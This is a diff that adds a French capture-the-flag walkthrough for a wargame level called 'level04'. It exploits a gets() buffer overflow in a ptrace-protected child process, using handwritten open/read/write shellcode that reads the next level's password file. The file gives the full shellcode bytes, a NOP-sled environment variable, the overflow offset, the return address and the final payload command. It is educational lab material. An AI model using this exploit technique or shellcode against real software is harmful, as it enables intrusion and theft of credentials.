@@ -1,0 +1,31 @@
+# Comme la string nous laisse l'entendre il y a bien un buffer overflow a faire sur le gets(); dans le process fille.
+# Cependant on ne peut pas faire comme d'habiture et ouvrir un shell avec un shellcode car c'est protege avec ptrace().
+
+# Donc on va simplement changer notre shellcode pour faire un open, read et write du flag
+
+# On ecrit notre code asm (dans shellcode.asm)
+
+nasm -f elf shellcode.asm
+
+# On va ensuite recuperer le bloc d'hexa dans le .text, et le convertir
+
+hexdump -e '16/1 "%02x " "\n"' shellcode.o | less
+
+On obtient notre nouveau shellcode:
+
+\x31\xc0\x50\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe3\x50\x31\xc9\x31\xd2\xb0\x05\xcd\x80\x89\xc3\x83\xec\x29\x89\xe1\xb2\x29\xb0\x03\xcd\x80\x31\xdb\xb3\x01\xb0\x04\xcd\x80
+
+# On va le mettre dans une variable d'environnement, overflow le gets pour jump sur ce code.
+
+export SHELLCODE=`python -c "print('\x90' * 4096 + '\x31\xc0\x50\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe3\x50\x31\xc9\x31\xd2\xb0\x05\xcd\x80\x89\xc3\x83\xec\x29\x89\xe1\xb2\x29\xb0\x03\xcd\x80\x31\xdb\xb3\x01\xb0\x04\xcd\x80')"`
+
+# Grace a la commande 'set follow-fork-mode child', on peut suivre notre fork dans gdb, on va donc chercher l'offset de l'adresse a modifier.
+# On obtient 156
+
+# On recupere l'adresse de notre shellcode donc 0xffffc885 + 2048 = 0xFFFFD085
+
+# On creer notre input
+
+python -c "print('0' * 156 + '\x85\xd0\xff\xff')" > /tmp/file
+
+cat /tmp/file | ./level04
